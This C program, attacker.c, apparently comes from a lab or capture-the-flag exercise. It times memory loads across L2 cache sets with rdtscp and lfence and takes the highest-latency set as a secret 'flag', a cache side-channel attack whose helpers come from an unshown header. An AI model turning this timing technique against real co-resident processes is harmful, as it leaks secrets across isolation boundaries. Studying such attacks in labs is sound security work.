// attacker.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>   // for sleep()
#include "util.h"     // 🔥 This is CRITICAL to include

#define NUM_SETS NUM_L2_CACHE_SETS
#define CACHE_LINES_PER_SET 8
#define SAMPLE_COUNT 1000

int main() {
    printf("Attacker started...\n");

    uint8_t *buf = get_buffer();  // allocate hugepage buffer
    if (!buf) {
        printf("Failed to allocate buffer.\n");
        return 1;
    }

    char **candidate_sets = get_candidate_sets();  // get candidate sets
    if (!candidate_sets) {
        printf("Failed to get candidate sets.\n");
        return 1;
    }

    uint64_t times[NUM_SETS] = {0};  // Store total latencies

    // Collect measurements
    for (int sample = 0; sample < SAMPLE_COUNT; sample++) {
        for (int set_idx = 0; set_idx < NUM_SETS; set_idx++) {
            uint64_t total_latency = 0;
            char **set = (char **)&candidate_sets[set_idx * CACHE_LINES_PER_SET];

            for (int i = 0; i < CACHE_LINES_PER_SET; i++) {
                lfence();
                uint64_t start = rdtscp64();
                *(volatile char *)set[i];
                lfence();
                uint64_t end = rdtscp64();
                total_latency += (end - start);
            }

            times[set_idx] += total_latency;
        }
    }

    // Find set with max latency
    int guessed_flag = -1;
    uint64_t max_latency = 0;
    for (int set_idx = 0; set_idx < NUM_SETS; set_idx++) {
        if (times[set_idx] > max_latency) {
            max_latency = times[set_idx];
            guessed_flag = set_idx;
        }
    }

    printf("\nFinal guessed flag is: %d\n", guessed_flag);

    return 0;
}
